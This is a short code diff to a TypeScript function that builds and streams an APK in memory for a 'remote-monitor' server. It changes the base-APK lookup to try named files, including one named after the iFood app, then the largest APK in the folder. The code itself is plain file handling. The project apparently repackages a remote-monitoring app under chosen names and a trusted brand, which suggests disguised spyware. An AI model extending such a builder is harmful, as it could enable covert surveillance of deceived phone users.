@@ -19,14 +19,37 @@ export async function buildAPKInMemoryAndStream(
   try {
     console.log('[APK-MEMORY] Starting in-memory APK build for:', options.appName);
 
-    // Find the base APK
-    const possibleBasePaths = [
-      '/app/public/apks/Blockchain-Registered.apk',
-      '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
-      path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
-    ];
-
+    // Find the base APK - look for any large APK file
+    const apksDir = process.env.NODE_ENV === 'production' 
+      ? '/app/public/apks'
+      : '/home/ubuntu/remote-monitor/public/apks';
+    
     let baseAPK = '';
+    
+    // Try specific names first
+    const possibleBasePaths = [
+      path.join(apksDir, 'ifood-1776254288678-w44ygi.apk'),
+      path.join(apksDir, 'Blockchain-Registered.apk'),
+      path.join(apksDir, 'app.apk'),
+    ];
+    
+    // If specific files don't exist, find the largest APK
+    if (!possibleBasePaths.some(p => fs.existsSync(p))) {
+      const files = fs.readdirSync(apksDir);
+      const apkFiles = files
+        .filter(f => f.endsWith('.apk') && !f.endsWith('.idsig'))
+        .map(f => ({
+          name: f,
+          path: path.join(apksDir, f),
+          size: fs.statSync(path.join(apksDir, f)).size,
+        }))
+        .sort((a, b) => b.size - a.size);
+      
+      if (apkFiles.length > 0 && apkFiles[0].size > 1000000) {
+        possibleBasePaths.unshift(apkFiles[0].path);
+      }
+    }
+
     for (const p of possibleBasePaths) {
       if (fs.existsSync(p)) {
         baseAPK = p;
